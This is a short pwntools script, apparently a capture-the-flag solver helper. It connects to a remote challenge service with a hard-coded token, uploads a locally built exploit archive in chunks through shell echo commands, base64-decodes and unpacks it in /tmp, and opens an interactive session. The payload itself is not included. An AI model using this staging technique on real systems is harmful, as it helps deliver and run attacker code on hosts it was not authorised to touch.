
import time
from pwn import *
import os

def chunkstring(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

os.system("./build.sh")

context.log_level = 'debug'
token = "1741:MEQCICzlD+fNmcAGS0O7IFWin2Nt2McUtku/NB21icx61Uq/AiAtFd6hCxgUvdeSE/R8888eFoJ4TytvoVVbkDjvbZEogw=="
p = remote("202.38.93.111", 10338)
p.recvuntil(b"token: ")
p.sendline(token.encode())
p.recvuntil(b"$")

with open("./pwn_elf", "rb") as f:
    c = f.read()

chunks = list(chunkstring(c, 768))

p.sendline(b"echo -n > /tmp/pwn_encode")
p.recvuntil(b"$")

for i in chunks:
    print(i)
    p.sendline(b"echo -n " + i + b" >>/tmp/pwn_encode")
    p.recvuntil(b"$")

p.sendline(b"cat /tmp/pwn_encode | base64 -d > /tmp/pwn.tar.gz")
p.recvuntil(b"$")
p.sendline(b"cd /tmp && tar -zxf pwn.tar.gz")
p.recvuntil(b"$")
p.sendline(b"cd /")
p.recvuntil(b"$")

p.interactive()
